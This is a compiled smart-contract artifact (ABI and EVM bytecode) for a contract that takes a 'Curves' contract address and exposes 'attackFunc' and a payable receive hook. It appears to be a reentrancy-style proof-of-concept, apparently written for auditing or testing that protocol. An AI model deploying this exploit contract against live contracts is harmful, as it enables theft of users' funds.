{"abi":[{"type":"constructor","inputs":[{"name":"_curves","type":"address","internalType":"contract Curves"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attackFunc","inputs":[],"outputs":[],"stateMutability":"payable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516103a83803806103a883398101604081905261002f91610066565b600080546001600160a01b03191633179055600180546001600160a81b0319166001600160a01b0392909216919091179055610096565b60006020828403121561007857600080fd5b81516001600160a01b038116811461008f57600080fd5b9392505050565b610303806100a56000396000f3fe6080604052600436106100225760003560e01c806356b6bedc1461007357600080fd5b3661006e57600154600160a01b900460ff161561006c5760408051808201909152600581526468656c6c6f60d81b602082015260015461006c9190600160a01b900460ff1661007b565b005b600080fd5b61006c6100c4565b6100c08282604051602401610091929190610270565b60408051601f198184030181529190526020810180516001600160e01b031663c3b5563560e01b179052610236565b5050565b60018054604051630928c57760e01b815230600482015260248101929092526001600160a01b031690630928c57790604401600060405180830381600087803b15801561011057600080fd5b505af1158015610124573d6000803e3d6000fd5b505060018054600160a01b60ff60a01b1982161790915560405163231a92b760e11b815230600482015260026024820152600093506001600160a01b039091169150634635256e9060440160206040518083038186803b15801561018757600080fd5b505afa15801561019b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101bf9190610257565b600154604051630928c57760e01b8152306004820152600260248201529192506001600160a01b031690630928c5779083906044016000604051808303818588803b15801561020d57600080fd5b505af1158015610221573d6000803e3d6000fd5b50506001805460ff60a01b1916905550505050565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b60006020828403121561026957600080fd5b5051919050565b604081526000835180604084015260005b8181101561029e5760208187018101516060868401015201610281565b818111156102b0576000606083860101525b50921515602083015250601f91909101601f19160160600191905056fea26469706673582212209d134dca708f80e1a1cf6b967d00d55c8d42fff2ed1f4c574bacb7a702b7857764736f6c63430008070033","linkReferences":{}},"methodIdentifiers":{"attackFunc()":"56b6bedc"},"id":34}